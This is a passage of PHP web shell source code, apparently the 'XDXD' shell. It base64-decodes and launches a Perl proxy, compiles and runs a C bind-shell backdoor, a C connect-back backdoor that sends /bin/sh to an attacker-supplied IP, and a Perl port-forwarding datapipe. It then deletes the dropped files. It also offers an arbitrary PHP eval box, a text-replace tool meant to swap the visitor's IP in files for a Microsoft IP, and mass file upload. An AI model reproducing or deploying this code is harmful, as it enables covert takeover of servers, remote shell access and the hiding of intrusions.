uZXRhZGRyKSwgIiAgcG9ydDogJHBvcnQgXG4iOw0KIy0tLSAgRm9yayBhIHN1YnByb2Nlc3MgdG8gaGFuZGxlIHJlcXVlc3QuDQojLS0tICBQYXJlbnQgcHJvY2VzIGNvbnRpbnVlcyBsaXN0ZW5pbmcuDQogICAgaWYgKGZvcmspIHsNCgl3YWl0OwkJIyBGb3Igbm93IHdlIHdhaXQgZm9yIHRoZSBjaGlsZCB0byBmaW5pc2gNCgluZXh0OwkJIyBXZSB3YWl0IHNvIHRoYXQgcHJpbnRvdXRzIGRvbid0IG1peA0KICAgIH0NCiMtLS0gIFJlYWQgZmlyc3QgbGluZSBvZiByZXF1ZXN0IGFuZCBhbmFseXplIGl0Lg0KIy0tLSAgUmV0dXJuIGFuZCBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QgbWV0aG9kLg0KICAgKCRmaXJzdCwkbWV0aG9kKSA9ICZhbmFseXplX3JlcXVlc3Q7DQojLS0tICBTZW5kIHJlcXVlc3QgdG8gcmVtb3RlIGhvc3QNCiAgICBwcmludCBVUkwgJGZpcnN0Ow0KICAgIHByaW50ICRmaXJzdDsNCiAgICB3aGlsZSAoPENISUxEPikgew0KCXByaW50ICRfOw0KCW5leHQgaWYgKC9Qcm94eS1Db25uZWN0aW9uOi8pOw0KCXByaW50IFVSTCAkXzsNCglsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvKTsNCiAgICB9DQogICAgaWYgKCRtZXRob2QgZXEgIlBPU1QiKSB7DQoJJGRhdGEgPSA8Q0hJTEQ+Ow0KCXByaW50ICRkYXRhOw0KCXByaW50IFVSTCAkZGF0YTsNCiAgICB9DQogICAgcHJpbnQgVVJMICJcbiI7DQojLS0tICBXYWl0IGZvciByZXNwb25zZSBhbmQgdHJhbnNmZXIgaXQgdG8gcmVxdWVzdG9yLg0KICAgIHByaW50ICIgLS0tIERvbmUgc2VuZGluZy4gUmVzcG9uc2U6IFxuXG4iOw0KICAgICRoZWFkZXIgPSAxOw0KICAgICR0ZXh0ID0gMDsNCiAgICB3aGlsZSAoPFVSTD4pIHsNCglwcmludCBDSElMRCAkXzsNCglpZiAoJGhlYWRlciB8fCAkdGV4dCkgewkgICAgICMgT25seSBwcmludCBoZWFkZXIgJiB0ZXh0IGxpbmVzIHRvIFNURE9VVA0KCSAgICBwcmludCAkXzsNCgkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15bXHNceDAwXSokLykgew0KCQkkaGVhZGVyID0gMDsNCgkgICAgfQ0KIwkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15Db250ZW50LXR5cGU6IHRleHQvKSB7DQojCQkkdGV4dCA9IDE7DQojCSAgICB9DQoJfQ0KICAgIH0NCiAgICBjbG9zZShVUkwpOw0KICAgIGNsb3NlKENISUxEKTsNCiAgICBleGl0OwkJCSMgRXhpdCBmcm9tIGNoaWxkIHByb2Nlc3MNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0JYW5hbHl6ZV9yZXF1ZXN0CQkJCQkJCS0tDQojLS0JCQkJCQkJCQktLQ0KIy0tCUFuYWx5emUgYSBuZXcgcmVxdWVzdC4gIEZpcnN0IHJlYWQgaW4gZmlyc3QgbGluZSBvZiByZXF1ZXN0LgktLQ0KIy0tCVJlYWQgVVJMIGZyb20gaXQsIHByb2Nlc3MgVVJMIGFuZCBvcGVuIGNvbm5lY3Rpb24uCQktLQ0KIy0tCVJldHVybiBhbiBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QJLS0NCiMtLQltZXRob2QuCQkJCQkJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBhbmFseXplX3JlcXVlc3Qgew0KIy0tLSAgUmVhZCBmaXJzdCBsaW5lIG9mIEhUVFAgcmVxdWVzdA0KICAgICRmaXJzdCA9IDxDSElMRD47DQoNCiAgICAkdXJsID0gKCRmaXJzdCA9fiBtfChodHRwOi8vXFMrKXwpWzBdOw0KICAgIHByaW50ICJSZXF1ZXN0IGZvciBVUkw6ICAkdXJsIFxuIjsNCg0KIy0tLSAgQ2hlY2sgaWYgZmlyc3QgbGluZSBpcyBvZiB0aGUgZm9ybSBHRVQgaHR0cDovL2hvc3QtbmFtZSAuLi4NCiAgICAoJG1ldGhvZCwgJHJlbW90ZV9ob3N0LCAkcmVtb3RlX3BvcnQpID0gDQoJKCRmaXJzdCA9fiBtIShHRVR8UE9TVHxIRUFEKSBodHRwOi8vKFteLzpdKyk6PyhcZCopISApOw0KIy0tLSAgSWYgbm90LCBiYWQgcmVxdWVzdC4NCiAgICANCiAgICBpZiAoISRyZW1vdGVfaG9zdCkgew0KCXByaW50ICRmaXJzdDsNCgl3aGlsZSAoPENISUxEPikgew0KCSAgICBwcmludCAkXzsNCgkgICAgbGFzdCBpZiAoJF8gPX4gL15bXHNceDAwXSokLyk7DQoJfQ0KCXByaW50ICJJbnZhbGlkIEhUVFAgcmVxdWVzdCBmcm9tICIsIGpvaW4oIi4iLCBAaW5ldGFkZHIpLCAiXG4iOw0KIwlwcmludCBDSElMRCAiQ29udGVudC10eXBlOiB0ZXh0L3BsYWluIiwiXG5cbiI7DQoJcHJpbnQgQ0hJTEQgIkkgZG9uJ3QgdW5kZXJzdGFuZCB5b3VyIHJlcXVlc3QuXG4iOw0KCWNsb3NlKENISUxEKTsNCglleGl0Ow0KICAgIH0NCiMtLS0gIElmIHJlcXVlc3RlZCBVUkwgaXMgdGhlIHByb3h5IHNlcnZlciB0aGVuIGlnbm9yZSByZXF1ZXN0DQogICAgJHJlbW90ZV9pcCA9IChnZXRob3N0YnluYW1lKCRyZW1vdGVfaG9zdCkpWzRdOw0KICAgIGlmICgoJHJlbW90ZV9pcCBlcSAkbG9jYWxfaG9zdF9pcCkgJiYgKCRyZW1vdGVfcG9ydCBlcSAkcHJveHlfcG9ydCkpIHsNCglwcmludCAkZmlyc3Q7DQoJd2hpbGUgKDxDSElMRD4pIHsNCgkgICAgcHJpbnQgJF87DQoJICAgIGxhc3QgaWYgKCRfID1+IC9eW1xzXHgwMF0qJC8pOw0KCX0NCglwcmludCAiIC0tLSBDb25uZWN0aW9uIHRvIHByb3h5IHNlcnZlciBpZ25vcmVkLlxuIjsNCiMJcHJpbnQgQ0hJTEQgIkNvbnRlbnQtdHlwZTogdGV4dC9wbGFpbiIsIlxuXG4iOw0KCXByaW50IENISUxEICJJdCdzIG5vdCBuaWNlIHRvIG1ha2UgbWUgbG9vcCBvbiBteXNlbGYhLlxuIjsNCgljbG9zZShDSElMRCk7DQoJZXhpdDsNCiAgICB9DQojLS0tICBTZXR1cCBjb25uZWN0aW9uIHRvIHRhcmdldCBob3N0IGFuZCBzZW5kIHJlcXVlc3QNCiAgICAkcmVtb3RlX3BvcnQgPSAiaHR0cCIgdW5sZXNzICgkcmVtb3RlX3BvcnQpOw0KICAgICZvcGVuX2Nvbm5lY3Rpb24oVVJMLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7DQojLS0tICBSZW1vdmUgcmVtb3RlIGhvc3RuYW1lIGZyb20gVVJMDQogICAgICAgICRmaXJzdCA9fiBzL2h0dHA6XC9cL1teXC9dKy8vOw0KICAgICgkZmlyc3QsICRtZXRob2QpOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLQlsaXN0ZW5fdG9fcG9ydChTT0NLRVQsICRwb3J0KQkJCQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgbGlzdGVucyB0byBhIHNwZWNpZmljIHBvcnQJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBsaXN0ZW5fdG9fcG9ydCB7DQogICAgbG9jYWwgKCRwb3J0KSA9ICRfWzFdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIsICRtYXhfcmVxdWVzdHMpOw0KICAgICRtYXhfcmVxdWVzdHMgPSAzOwkJIyBNYXggbnVtYmVyIG9mIG91dHN0YW5kaW5nIHJlcXVlc3RzDQogICAgJHNvY2tldF9mb3JtYXQgPSAnUyBuIGE0IHg4JzsNCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcGFja2VkX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICJcMFwwXDBcMCIpOw0KICAgIHNvY2tldCgkX1swXSwgJlBGX0lORVQsICZTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUgInNvY2tldDogJCEiOw0KICAgIGJpbmQoJF9bMF0sICRwYWNrZWRfcG9ydCkgfHwgZGllICJiaW5kOiAkISI7DQogICAgbGlzdGVuKCRfWzBdLCAkbWF4X3JlcXVlc3RzKSB8fCBkaWUgImxpc3RlbjogJCEiOw0KICAgICRjdXIgPSBzZWxlY3QoJF9bMF0pOyAgDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQogICAgfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tCW9wZW5fY29ubmVjdGlvbihTT0NLRVQsICRyZW1vdGVfaG9zdG5hbWUsICRwb3J0KQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgY29ubmVjdHMgdG8gYSBjZXJ0YWluIGhvc3QJCQktLQ0KIy0tCSRsb2NhbF9ob3N0X2lwIGlzIGFzc3VtZWQgdG8gYmUgbG9jYWwgaG9zdG5hbWUgSVAgYWRkcmVzcwktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBvcGVuX2Nvbm5lY3Rpb24gew0KICAgIGxvY2FsICgkcmVtb3RlX2hvc3RuYW1lLCAkcG9ydCkgPSBAX1sxLDJdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIpOw0KICAgIGxvY2FsICgkcmVtb3RlX2FkZHIsIEByZW1vdGVfaXAsICRyZW1vdGVfaXApOw0KICAgIGxvY2FsICgkbG9jYWxfcG9ydCwgJHJlbW90ZV9wb3J0KTsNCiAgICBpZiAoJHBvcnQgIX4gL15cZCskLykgew0KCSRwb3J0ID0gKGdldHNlcnZieW5hbWUoJHBvcnQsICJ0Y3AiKSlbMl07DQoJJHBvcnQgPSA2NjY3IHVubGVzcyAoJHBvcnQpOw0KICAgIH0NCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcmVtb3RlX2FkZHIgPSAoZ2V0aG9zdGJ5bmFtZSgkcmVtb3RlX2hvc3RuYW1lKSlbNF07DQogICAgaWYgKCEkcmVtb3RlX2FkZHIpIHsNCglkaWUgIlVua25vd24gaG9zdDogJHJlbW90ZV9ob3N0bmFtZSI7DQogICAgfQ0KDQogICAgQHJlbW90ZV9pcCA9IHVucGFjaygiQzQiLCAkcmVtb3RlX2FkZHIpOw0KICAgICRyZW1vdGVfaXAgPSBqb2luKCIuIiwgQHJlbW90ZV9pcCk7DQogICAgcHJpbnQgIkNvbm5lY3RpbmcgdG8gJHJlbW90ZV9pcCBwb3J0ICRwb3J0LlxuXG4iOw0KICAgICRzb2NrZXRfZm9ybWF0ID0gJ1MgbiBhNCB4OCc7DQogICAgJGxvY2FsX3BvcnQgID0gcGFjaygkc29ja2V0X2Zvcm1hdCwgJkFGX0lORVQsIDAsICRsb2NhbF9ob3N0X2lwKTsNCiAgICAkcmVtb3RlX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICRyZW1vdGVfYWRkcik7DQogICAgc29ja2V0KCRfWzBdLCAmQUZfSU5FVCwgJlNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAic29ja2V0OiAkISI7DQogICAgYmluZCgkX1swXSwgJGxvY2FsX3BvcnQpIHx8IGRpZSAiYmluZDogJCEiOw0KICAgIGNvbm5lY3QoJF9bMF0sICRyZW1vdGVfcG9ydCkgfHwgZGllICJzb2NrZXQ6ICQhIjsNCiAgICAkY3VyID0gc2VsZWN0KCRfWzBdKTsgIA0KDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQp9DQoNCg==";

if(is_writable("/tmp")){
$fp=fopen("/tmp/XDXD_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl /tmp/XDXD_perl_proxy.pl $port &");
unlink("/tmp/XDXD_perl_proxy.pl");
}else{
if(is_writable(".")){
mkdir(".XDXD_proxy_tmp");
$fp=fopen(".XDXD_proxy_tmp/XDXD_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl .XDXD_proxy_tmp/XDXD_perl_proxy.pl $port &");
unlink(".XDXD_proxy_tmp/XDXD_perl_proxy.pl");
rmdir(".XDXD_proxy_tmp");
}
}
$show_ps="1";
}#end of start perl_proxy

if($_POST['c_bd']){
$port=$_POST['port'];
$c_bd_scp = "#define PORT $port
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
struct sockaddr_in serv_addr;
struct sockaddr_in client_addr;

int main ()
{
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (soc_des == -1)
        exit(-1);
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0)
        exit(-1);
    if (fork() != 0)
        exit(0);
    setpgrp();
    signal(SIGHUP, SIG_IGN);
    if (fork() != 0)
        exit(0);
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0)
        exit(0);
    while (1) {
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
        if (soc_cli < 0)
            exit(0);
        cli_pid = getpid();
        server_pid = fork();
        if (server_pid != 0) {
            dup2(soc_cli,0);
            dup2(soc_cli,1);
            dup2(soc_cli,2);
            execl(\"/bin/sh\",\"sh\",(char *)0);
            close(soc_cli);
            exit(0);
        }
    close(soc_cli);
    }
}

";


if(is_writable("/tmp")){
$fp=fopen("/tmp/XDXD_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc /tmp/XDXD_c_bd.c -o /tmp/XDXD_bd");
passthru("nohup /tmp/XDXD_bd &");
unlink("/tmp/XDXD_c_bd.c");
unlink("/tmp/XDXD_bd");
}else{
if(is_writable(".")){
mkdir(".XDXD_bd_tmp");
$fp=fopen(".XDXD_bd_tmp/XDXD_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc .XDXD_bd_tmp/XDXD_c_bd.c -o .XDXD_bd_tmp/XDXD_bd");
passthru("nohup .XDXD_bd_tmp/XDXD_bd &");
unlink(".XDXD_bd_tmp/XDXD_bd");
unlink(".XDXD_bd_tmp/XDXD_c_bd.c");
rmdir(".XDXD_bd_tmp");
}
}
$show_ps="1";
}#end of c bd


if($_POST['bc_c']){ # nc -l -p 4500
$port_c = $_POST['port_c'];
$ip=$_POST['ip'];
$bc_c_scp = "#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#include <netinet/in.h>
#include <netdb.h>

int fd, sock;
int port = $port_c;
struct sockaddr_in addr;

char mesg[]  = \"::Connect-Back Backdoor:: CMD: \";
char shell[] = \"/bin/sh\";

int main(int argc, char *argv[]) {
        while(argc<2) {
        fprintf(stderr, \" %s <ip> \", argv[0]);
        exit(0); }

addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = inet_addr(argv[1]);
fd = socket(AF_INET, SOCK_STREAM, 0);
connect(fd, (struct sockaddr*)&addr, sizeof(addr));

send(fd, mesg, sizeof(mesg), 0);

dup2(fd, 0);
dup2(fd, 1);
dup2(fd, 2);
execl(shell, \"in.telnetd\", 0);

close(fd);
return 1;
}

";

if(is_writable("/tmp")){
if(file_exists("/tmp/XDXD_c_bc_c.c")){unlink("/tmp/XDXD_c_bc_c.c");}
if(file_exists("/tmp/XDXD_c_bc_c.c")){unlink("/tmp/XDXD_c_bc");}
$fp=fopen("/tmp/XDXD_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc /tmp/XDXD_c_bc_c.c -o /tmp/XDXD_bc_c");
passthru("nohup /tmp/XDXD_bc_c $ip &");
unlink("/tmp/XDXD_bc_c");
unlink("/tmp/XDXD_bc_c.c");
}else{
if(is_writable(".")){
mkdir(".XDXD_bc_c_tmp");
$fp=fopen(".XDXD_bc_c_tmp/XDXD_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc .XDXD_bc_c_tmp/XDXD_c_bc_c.c -o .XDXD_bc_c_tmp/XDXD_bc_c");
passthru("nohup .XDXD_bc_c_tmp/XDXD_bc_c $ip &");
unlink(".XDXD_bc_c_tmp/XDXD_bc_c.c");
unlink(".XDXD_bc_c_tmp/XDXD_bc_c");
rmdir(".XDXD_bc_c_tmp");
}
}
$show_ps="1";

}#end of back connect C


if($_POST['datapipe_pl']){
$port_2=$_POST['port_2'];
$port_3=$_POST['port_3'];
$ip=$_POST['ip'];
$datapipe_pl = "
#!/usr/bin/perl
# coded by CuTTer (rus hacker)
use IO::Socket;
use POSIX;

\$localport=$port_2;
\$host=\"$ip\";
\$port=$port_3;

\$daemon=1;

\$DIR = undef;

##  ??(1-, 0-?
\$log=0;




\$| = 1;

if (\$daemon){
        print \"3anycKaeM daemon\n\";

        \$pid = fork;
        exit if \$pid;
        die \"Couldn't fork: \$!\" unless defined(\$pid);
        POSIX::setsid() or die \"Can't start a new session: \$!\";
}

%o = ('port' => \$localport,
          'toport' => \$port,
          'tohost' => \$host);

\$ah = IO::Socket::INET->new(
                         'LocalPort' => \$localport,
                         'Reuse' => 1,
                         'Listen' => 10)
    || die \"? ?? : \$!\";

print \" ? ?\n\" if \$log;
\$SIG{'CHLD'} = 'IGNORE';
\$num = 0;
while (1) {
        \$ch = \$ah->accept();
        if (!\$ch) {
                print STDERR \" ?accept: \$!\n\";
                next;
        }

        printf(\"?: host %s, port %s.\n\",
        \$ch->peerhost(), \$ch->peerport()) if \$log;
        ++\$num;
        \$pid = fork();
        if (!defined(\$pid)) {
                print STDERR \" ?fork: \$!\n\";
    } elsif (\$pid == 0) {
## ??
                \$ah->close();
                Run(\%o, \$ch, \$num);
        } else {
                print \"Parent: Fork  ? ??\n\" if \$log;
                \$ch->close();
        }
}


sub Run {
        my(\$o, \$ch, \$num) = @_;
        my \$th = IO::Socket::INET->new('PeerAddr' => \$o->{'tohost'},
                                                        'PeerPort' => \$o->{'toport'});
        print(\"Child:    \$o->{'tohost'},  \$o->{'toport'}.\n\") if \$log;
        if (!\$th) {
                printf STDERR (\"Child: ?  %s,  %s.\n\",
                \$o->{'tohost'}, \$o->{'toport'});
                exit 0;
        }

        my \$fh;
        if (\$o->{'dir'}) {
                \$fh = Symbol::gensym();
                open(\$fh, \">\$o->{'dir'}/tunnel\$num.log\")
                or die \"Child:   ??\$o->{'dir'}/tunnel\$num.log: \$!\";
        }

        \$ch->autoflush();
        \$th->autoflush();
        while (\$ch || \$th) {
                print \"Child:  .\n\" if \$log;
                my \$rin = \"\";
                vec(\$rin, fileno(\$ch), 1) = 1 if \$ch;
                vec(\$rin, fileno(\$th), 1) = 1 if \$th;
                my(\$rout, \$eout);
                select(\$rout = \$rin, undef, \$eout = \$rin, 120);
                if (!\$rout  &&  !\$eout) {
                        print STDERR \"Child:  Timeout.\n\";
                }
                my \$cbuffer = \"\";
                my \$tbuffer = \"\";

                if (\$ch && (vec(\$eout, fileno(\$ch), 1) || vec(\$rout, fileno(\$ch), 1))) {
                        print \"Child:    ?\n\" if \$log;
                        my \$result = sysread(\$ch, \$tbuffer, 1024);
                        if (!defined(\$result)) {
                                print STDERR \"Child:  ?  ? \$!\n\";
                                exit 0;
                        }
                        if (\$result == 0) {
                                print \"Child:  ?.\n\" if \$log;
                                exit 0;
                        }

                        print \"Child: : \$cbuffer\n\" if \$log;
                }

                if (\$th  &&  (vec(\$eout, fileno(\$th), 1)  || vec(\$rout, fileno(\$th), 1))) {
                        print \"Child:  .\n\" if \$log;
                        my \$result = sysread(\$th, \$cbuffer, 1024);
                        if (!defined(\$result)) {
                                print STDERR \"Child:  ?: \$!\n\";
                                exit 0;
                        }

                        if (\$result == 0) {
                                print \"Child: ?.\n\" if \$log;
                                exit 0;
                        }

                        print \"Child: : \$cbuffer\n\" if \$log;
            }

                if (\$fh  &&  \$tbuffer) {
                        (print \$fh \$tbuffer);
                }

                while (my \$len = length(\$tbuffer)) {
                        print \"Child: ? \$len .\n\" if \$log;
                        my \$res = syswrite(\$th, \$tbuffer, \$len);
                        print \"Child:  .\n\" if \$log;
                        if (\$res > 0) {
                                \$tbuffer = substr(\$tbuffer, \$res);
                        } else {
                                print STDERR \"Child:  ?: \$!\n\";
                        }
                }

                while (my \$len = length(\$cbuffer)) {
                        print \"Child: ? \$len  ?\n\" if \$log;
                        my \$res = syswrite(\$ch, \$cbuffer, \$len);
                        print \"Child:  ..\n\" if \$log;
                        if (\$res > 0) {
                                \$cbuffer = substr(\$cbuffer, \$res);
                        } else {
                                print STDERR \"Child:  ?: \$!\n\";
                        }
                }
        }
}

";

if(is_writable("/tmp")){
$fp=fopen("/tmp/XDXD_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl /tmp/XDXD_perl_datapipe.pl &");
unlink("/tmp/XDXD_perl_datapipe.pl");
}else{
if(is_writable(".")){
mkdir(".XDXD_datapipe_tmp");
$fp=fopen(".XDXD_datapipe_tmp/XDXD_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl .XDXD_datapipe_tmp/XDXD_perl_datapipe.pl &");
unlink(".XDXD_datapipe_tmp/XDXD_perl_datapipe.pl");
rmdir(".XDXD_datapipe_tmp");
}
}
$show_ps="1";

}#end of datapipe perl





if($show_ps=="1"){
print "<center><b>[ps ux]</b></center><br><br>";
print "<pre>";
passthru("ps ux");
print "</pre><br><br>";
}



echo "<form method=post><b>md5:</b><br><input name=md5 size=30>
<Br>
md5 online encoder/decoder (brutforce) (php) - [<a href=http://XDXD.void.ru/?q=releases&download=4>DOWNLOAD</a>]
</form>
";
@$md5=@$_POST['md5'];
if(@$_POST['md5']){ echo "md5:<br><textarea rows=1 cols=113>".md5($md5)."</textarea>";}
echo "<br>
<form method=post><b>base64 e/d:</b><br><input name=base64 size=30></form><br>";
if(@$_POST['base64']){
@$base64=$_POST['base64'];
echo "
<b>Encode: <br><textarea rows=15 cols=113>".base64_encode($base64)."</textarea><br>
Decode:</b> <br><textarea rows=15 cols=113>".base64_decode($base64)."</textarea><br>";}
echo "<br>
<form method=post><b>DES:</b><br><input name=des size=30><br>
John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>";
if(@$_POST['des']){
@$des=@$_POST['des'];
echo "<b>Des:</b> <br><textarea rows=15 cols=113>".crypt($des)."</textarea>";}

print "
<b>eval:</b<br>
(example: print \"Hello World\";)
<form method=post>
<font color=red><b>&lt;?</b><br>
<textarea name=eval rows=15 cols=113></textarea><br>
<b>?&gt;</b></font><br>
<input type=submit value=Run style='width:150px;'>
</form><br>
";

function eval_sl($editf){
if(get_magic_quotes_gpc()==1){
$editf=stripslashes($editf);
}
return $editf;
}


if($_POST['eval']){
print "<b>RESULT:<br><br></b>";
eval(eval_sl($_POST['eval']));
print "<br><br>";

print "<font color=green><b>PHP:</b><br>\r\n\r\n";
print "&lt;?\r\n";
print "<br>";
print htmlspecialchars(eval_sl(($_POST['eval'])));
print "<br>";
print "?&gt;\r\n\r\n</font><br><br>";

}

echo $copyr;
exit;}

if(@$_GET['replace']=="1"){
$ip=@$_SERVER['REMOTE_ADDR'];
$d=$_GET['d'];
$e=$_GET['e'];
@$de=$d."/".$e;
$de=str_replace("//","/",$de);
$e=@$e;
echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
echo "
Replace tool:<br>
(You can replace any text)<br>
File: $de<br>
<form method=post>
1. Your ip.<br>
2. microsoft.com ip :)<br>
Replace this <input name=thisX size=30 value=$ip> by this <input name=bythis size=30 value=207.46.245.156>
<input type=submit name=doit value=Replace>
</form>
";

if(@$_POST['doit']){
@$thisX=$_POST['thisX'];
@$bythis=$_POST['bythis'];
@$e=$_GET['e'];
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$rpl = @fread ($fd, @filesize ($filename));
$re=str_replace("$thisX","$bythis",$rpl);
$x=@fopen("$d/$e","w");
@fwrite($x,"$re");
echo "<br><center>$thisX Replaced by $bythis<br>
[<a href='$php_self?d=$d&e=$e'>VIew file</a>]<br><br><Br>";

}
echo $copyr;
exit;}


if(@$_GET['t']=="upload"){
echo "<br>
<a href='$php_self?d=$d&t=massupload'>* Mass upload *</a><br>
File upload:<br>
<form enctype=\"multipart/form-data\" method=post>
<input type=file name=text size=50><br>
<input name=where size=52 value='$d'><br>
New file name:<br>
<input name=newf size=30 autocomplete=off> (if empty, it will be default)<br>
<input type=submit value=Upload name=uploadf>
</form><br>
";

if(@$_POST['uploadf']){
$where=$_POST['where'];
$newf=$_POST['newf'];
$where=str_replace("//","/",$where);
if($newf==""){$newf=$_FILES['text']['name'];}else{$newf=$newf;}
$uploadfile = "$where/".$newf;
if (@move_uploaded_file(@$_FILES['text']['tmp_name'], $uploadfile)) {
$uploadfile=str_replace("//","/",$uploadfile);
echo "<i><br>Uploaded to $uploadfile</i><br>";
}else{
echo "<i><br>Error</i><br>";}
}
}

if(@$_GET['t']=="massupload"){
echo "
Mass upload:<br>
<form enctype=\"multipart/form-data\" method=post>
<input type=file name=text1 size=43> <input type=file name=text11 size=43><br>
<input type=file name=text2 size=43> <input type=file name=text12 size=43><br>
<input type=file name=text3 size=43> <input type=file name=text13 size=43><br>
<input type=file name=text4 size=43> <input type=file name=text14 size=43><br>
<input type=file name=text5 size=43> <input type=file name=text15 size=43><br>
<input type=file name=text6 size=43> <input type=file name=text16 size=43><br>
<input type=file name=text7 size=43> <input type=file name=text17 size=43><br>
<input type=file name=text8 size=43> <input type=file name=text18 size=43><br>
<input type=file name=text9 size=43> <input type=file name=text19 size=43><br>
<input type=file name=text10 size=43> <input type=file name=text20 size=43><br>
<input name=where size=43 value='$d'><br>
<input type=submit value=Upload name=massupload>
</form><br>";

if(@$_POST['massupload']){
$where=@$_POST['where'];
$uploadfile1 = "$where/".@$_FILES['text1']['name'];
$uploadfile2 = "$where/".@$_FILES['text2']['name'];
$uploadfile3 = "$where/".@$_FILES['text3']['name'];
$uploadfile4 = "$where/".@$_FILES['text4']['name'];
$uploadfile5 = "$where/".@$_FILES['text5']['name'];
$uploadfile6 = "$where/".@$_FILES['text6']['name'];
$uploadfile7 = "$where/".@$_FILES['text7']['name'];
$uploadfile8 = "$where/".@$_FILES['text8']['name'];
$uploadfile9 = "$where/".@$_FILES['text9']['name'];
$uploadfile10 = "$where/".@$_FILES['text10']['name'];
$uploadfile11 = "$where/".@$_FILES['text11']['name'];
$uploadfile12 = "$where/".@$_FILES['text12']['name'];
$uploadfile13 = "$where/".@$_FILES['text13']['name'];
$uploadfile14 = "$where/".@$_FILES['text14']['name'];
$uploadfile15 = "$where/".@$_FILES['text15']['name'];
$uploadfile16 = "$where/".@$_FILES['text16']['name'];
$uploadfile17 = "$where/".@$_FILES['text17']['name'];
